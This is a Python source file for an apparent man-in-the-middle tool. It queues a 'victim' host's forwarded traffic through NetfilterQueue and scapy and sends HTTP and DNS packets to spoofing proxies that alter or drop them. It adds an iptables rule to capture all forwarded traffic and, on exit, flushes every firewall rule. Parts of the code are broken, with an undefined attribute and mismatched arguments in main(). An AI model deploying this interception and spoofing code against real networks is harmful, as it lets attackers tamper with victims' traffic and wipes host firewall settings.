#!/usr/bin/env python

from __future__ import print_function
from netfilterqueue import NetfilterQueue
from scapy.all import *
from multiprocessing import Process
from multiprocessing import Event
try:
    from scapy_http.http import *
except ImportError:
    from scapy.layers.http import *

from DNSproxy import DNSproxy
from HTTPproxy import HTTPproxy

class NetQueue(Process):
    def __init__(self, params, conf):
        super(NetQueue, self).__init__()
        self.counter = 0   
        self.q = NetfilterQueue()
        self.q.bind(1, self.cb)
        self.params = params
        self.params.conf = conf
        self.DNSworker = DNSproxy(self.params)
        self.HTTPworker = HTTPproxy(self.params)
    
    @staticmethod
    def accept(original_pkt, spoofed_pkt):
        original_pkt.accept()
        print (" <-- accepted")
    @staticmethod
    def drop(original_pkt, spoofed_pkt):
        original_pkt.drop()
        print (" <-- dropped")

    @staticmethod
    def modify(original_pkt, spoofed_pkt):
        original_pkt.set_payload(str(spoofed_pkt))
        original_pkt.accept()
        print (" <-- modified")

    def cb(self, payload):
        data = payload.get_payload()
        pkt = IP(data)
        proto = pkt.proto
        target = '\033[92mvictim\033[0m' if pkt.src == self.params.target else pkt.src
        dest = '\033[92mvictim\033[0m' if pkt.dst == self.params.target else pkt.dst
        print("New packet from: " + target + " to: " + dest + " / ", end="");
        meth_map = {0 : self.accept,
                    1 : self.modify,
                    2 : self.drop
        }
        ret = {'meth': 0}
        if proto is 0x06:
            if pkt[TCP].dport is 80 or pkt[TCP].sport is 80:
                ret = self.HTTPworker.call(payload)
            else:
                print("FORWARDING SMTG STRANGE BUDDY", end="")
            '''
            TODO
            if pkt[TCP].dport is 443:
                print("HTTPS", end="")        
            elif pkt[TCP].dport is 21 or pkt[TCP].dport is 20 or pkt[TCP].dport is 115:
                print("FTP", end="")
            elif pkt[TCP].dport is 22:
                print("SSH", end="")
            '''
        elif proto is 0x11:
            if pkt[UDP].dport is 53:
                ret = self.DNSworker.call(pkt)
            elif pkt[UDP].sport is 53:
                print ("DNS answer", end="")
        elif proto is 0x01:
            print ("ICMP", end="")
        elif proto is 0x29:
            print ("IPv6", end="")
        elif proto is 0x2b:
            print ("IPv6-Route", end="")
        
        if not 'spoofed_pkt' in ret:
            ret['spoofed_pkt'] = None
        meth_map[ret['meth']](payload, ret['spoofed_pkt'])

    def run(self):
        os.system('iptables -A FORWARD -j NFQUEUE --queue-num 1')

        try:
            self.q.run()
            self.qInput.run()

        except KeyboardInterrupt:
            self.restore()
            return; 

    def restore(self):
        self.q.unbind()
        self.HTTPworker.stop()
        self.DNSworker.stop()
        os.system('iptables -F') # oops ...
        os.system('iptables -X') # oops ...
        return;

def main():
    obj = NetQueue("ens33", "192.168.1.1")
    obj.start()

if __name__ == "__main__":
    main()
